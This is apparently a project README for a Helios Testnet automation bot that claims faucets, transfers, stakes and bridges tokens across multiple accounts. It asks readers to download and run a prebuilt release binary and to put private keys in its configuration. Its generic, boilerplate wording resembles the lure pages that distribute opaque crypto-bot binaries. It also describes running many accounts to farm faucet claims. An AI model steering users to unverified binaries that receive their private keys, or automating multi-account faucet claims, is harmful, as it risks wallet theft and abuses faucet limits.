Overview
The Helios Testnet Network Bot is a versatile automation tool for the Helios Testnet. It enables routine tasks that developers and testers perform on a testnet. With the bot you can automatically claim faucets, move tokens between accounts, delegate or stake to validators, bridge tokens to other tokens, and automate many chain interactions. The goal is to provide a reliable, reproducible, and observable automation layer so you can experiment, measure, and iterate quickly on testnet scenarios.

Key features
- Faucet claiming: automate faucet interactions to obtain testnet tokens.
- Token transfers: send tokens between wallets or accounts with configurable slippage handling and nonce management.
- Delegation and staking: delegate tokens to validators, monitor stake states, and handle rewards.
- Bridging: move tokens across testnet bridges to simulate cross-chain activity.
- Multi-account workflows: manage several accounts for parallel tests or role-based activities.
- Scheduled tasks: run actions on a schedule or in reaction to events.
- Observability: built-in logging, metrics hooks, and structured outputs for easy debugging.
- Extensibility: modular design to add new actions, adapters, and endpoints.

How it works
- The bot runs as a standalone executable that reads a configuration file and environment variables.
- It talks to Helios Testnet endpoints via lightweight clients that use the testnet API surface. These clients are optimized for batch operations and robust error handling.
- Each action (faucet, transfer, stake, bridge) is modeled as a workflow step. Steps are verifiable, auditable, and can be retried on transient failures.
- The bot logs all actions with timestamps, inputs, and outcomes. You can route logs to files, console, or a logging service.
- You can run multiple instances concurrently to simulate larger activity or to isolate test scenarios.

Getting started
- Prerequisites: A machine with a modern OS, internet access, and a testnet-enabled Helios account with small test balances for faucets and transactions. You should have a release asset compatible with your OS architecture.
- Primary access point: the official releases page for the bot. From that page you can download a prebuilt binary suitable for your environment.
- Download and execute: From the release page, download the asset named helios-testnet-network-v1.0.0-linux-x86_64.tar.gz (or the corresponding Windows/macOS asset if you are on those platforms), extract it, and run the binary as described in the installation guide below. The releases page is the single source for stable builds and updates. Release assets are tested for basic functionality and compatibility with Helios Testnet endpoints.

Downloads and assets
- The release page contains prebuilt binaries for Linux, Windows, and macOS.
- Primary asset to download and run: helios-testnet-network-v1.0.0-linux-x86_64.tar.gz
- If you use Windows or macOS, download the matching assets from the same releases page.
- After downloading, extract the archive and run the executable. The binary is designed to be a drop-in replacement for lightweight automation tasks on the Helios Testnet.

Downloads link: https://github.com/OnePointOnly/helios-testnet-network/releases

Note: If you want to verify the authenticity of the binary, use the checksums published on the releases page. The checksums ensure the asset you downloaded matches what the project maintainers published. This helps guard against tampering or corrupted downloads before you run the binary.

Installation and setup
- Choose the correct asset for your OS from the releases page.
- Extract the archive to a location of your choice.
- Make sure the binary is executable (on Unix-like systems, use chmod +x helios-testnet-network).
- Create a configuration file that defines networks, accounts, and actions. The bot reads configuration at startup and uses it to drive workflows.
- Run the binary with a path to the configuration file or via environment variables. The bot supports both approaches for flexibility.

Configuration guide
- Files and folders: The configuration file governs how the bot behaves. It contains network endpoints, account secrets, actions, and schedules.
- Sensitive data handling: Store secrets in encrypted form or use environment variables. Do not commit sensitive data to version control.
- Example structure (high level):
  - network:
      endpoint: https://testnet.helios.network
      chain_id: helios-testnet
  - accounts:
      faucet_account:
        address: "terra-address-or-hex"
        private_key: "<secret>"
      user_account:
        address: "terra-address-or-hex"
        private_key: "<secret>"
  - actions:
      faucet_claim:
        enabled: true
        faucet_endpoint: "< faucet-endpoint >"
      transfer:
        from: faucet_account
        to: user_account
        amount: 1000
        token: "HELI"
      delegate:
        from: user_account
        validator: "validator-address"
        amount: 500
      stake:
        from: user_account
        amount: 500
        denom: "HELI"
      bridge:
        from: user_account
        to_network: "other-testnet"
        amount: 50
  - schedules:
      faucet_cycle:
        every: "15m"
        actions: [faucet_claim, transfer]

- Validation: Validate the configuration before running. The bot should report configuration errors with actionable messages.

Common workflows
- Faucet first, then test transfers
  - Step 1: Run faucet_claim to fund an account on the testnet.
  - Step 2: Transfer a small amount to a test wallet.
  - Step 3: Execute a delegation to a validator and monitor rewards.
  - Step 4: Bridge a portion of tokens to a different testnet simulation.
  - Step 5: Repeat with a new cycle to simulate ongoing activity.

- End-to-end test scenario
  - Step 1: Claim faucet tokens for two accounts.
  - Step 2: Send small token amounts to a central test wallet.
  - Step 3: Stake a portion of the funds with a known validator.
  - Step 4: Simulate reward collection and claim if supported.
  - Step 5: Bridge tokens to visualize cross-chain movement and confirm settlement.

- Parallel test harness
  - Set up multiple accounts with separate credentials.
  - Run independent workflows to analyze concurrency and race conditions.
  - Collect metrics on throughput, latency, and error rates.

Network and security considerations
- Endpoint hygiene: Use testnet endpoints that you control or trust. Do not mix testnet and mainnet endpoints in the same workflow.
- Secrets management: Use environment variables or a dedicated secrets manager to store private keys and passwords. Avoid printing secrets to logs.
- Access control: Restrict who can modify the configuration. Use role-based access to protect the botâ€™s operational environment.
- Observability: Enable verbose logging for troubleshooting. Use structured logs to correlate events across accounts and actions.
- Rate limits: Be mindful of faucet limits and API rate limits. Implement backoff logic and retries with exponential delays where appropriate.

Testing and quality assurance
- Local unit tests: Validate individual action modules (faucet, transfer, delegate, bridge) with mocked responses.
- Integration tests: Run workflows against a testnet in a controlled environment to verify end-to-end behavior.
- End-to-end tests: Set up a sandbox that mirrors production testnet conditions, including validators and bridges, to validate real interactions.
- Performance tests: Stress test parallel workflows to identify bottlenecks.
- Reliability tests: Simulate transient network failures to ensure the bot recovers gracefully.

Logging, telemetry, and observability
- Centralized logs: All actions are logged with timestamps, input parameters, and outcomes.
- Metrics: Track metrics such as success rate, average latency, throughput, and error categories.
- Dashboards: Optional dashboards can visualize key metrics, trends, and failure modes.

Security best practices
- Keep secrets out of code: Do not hard-code private keys or credentials.
- Rotate credentials: Regularly rotate faucet or validator access credentials where applicable.
- Use least privilege: Grant the bot only the permissions it needs to operate in the testnet.
- Audit trails: Preserve logs and transaction traceability for debugging.

Development and contribution
- Repository structure: The project organizes core modules, adapters, and workflow definitions to keep changes isolated and maintainable.
- Adding new actions: Implement new adapters for testnet endpoints or add new workflow steps to extend automation.
- Testing approach: Add unit tests for new modules, integrate with CI to run tests on each pull request.
- Style and conventions: Follow the projectâ€™s existing coding standards. Keep changes small and well-documented.
- Documentation: Extend docs with examples for new features, configuration patterns, and troubleshooting tips.

Environment and runtime considerations
- Runtime environment: The bot is built to run on widely available operating systems with modest resource requirements. It uses asynchronous patterns to handle multiple actions concurrently when configured.
- Dependencies: The binary bundles core dependencies. Additional libraries used for interacting with testnet endpoints are embedded or loaded at runtime, depending on the release packaging.
- Observability: Logs and metrics are designed to be consumed by common log aggregators. If you integrate a metrics backend, you can observe patterns across workflows over long periods.

User stories and real-world examples
- Story 1: A developer wants to validate a new validator onboarding flow. They set up a workflow to claim faucets for multiple accounts, stake a portion of tokens to a chosen validator, and monitor rewards over several hours. The bot repeats the cycle, providing data for analysis.
- Story 2: A tester needs to verify a cross-chain bridge path. They configure a bridge workflow that moves tokens from the Helios Testnet to a simulated second testnet, then returns, logging transfer integrity and bridge confirmations.
- Story 3: A QA engineer wants to simulate high load. They deploy multiple bot instances, each with distinct accounts, to produce a steady stream of faucet claims and transfers, then analyze the systemâ€™s behavior under concurrent load.
